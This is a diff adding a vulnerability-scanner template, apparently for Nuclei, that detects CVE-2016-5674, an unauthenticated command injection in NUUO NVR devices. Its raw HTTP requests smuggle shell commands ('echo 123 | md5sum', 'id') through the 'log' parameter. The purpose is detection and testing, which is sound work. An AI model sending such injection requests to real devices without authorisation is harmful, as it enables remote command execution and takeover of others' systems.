@@ -1,0 +1,41 @@
+id: nuuo-nvr-command-execution
+info:
+  name: NUUO NVR __debugging_center_utils___.php Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The NUUO NVR video storage management device __debugging_center_utils___.php has an unauthorized remote command execution vulnerability. An attacker can execute arbitrary system commands without any permissions, thereby invading the server and obtaining administrator permissions on the server.
+  tags: command-execution
+  reference:
+    - https://fofa.info/
+  classification:
+    cve-id: CVE-2016-5674
+    cvss-score: 9
+http:
+  - raw:
+      - |
+        GET /__debugging_center_utils___.php?log=;echo%20123%20|%20md5sum HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "ba1f2511fc30423bdbb183fe33f3dd0f"
+  - raw:
+      - |
+        GET /__debugging_center_utils___.php?log=;{{cmd}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+    payloads:
+      cmd:
+        - "echo test"
+        - "id"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
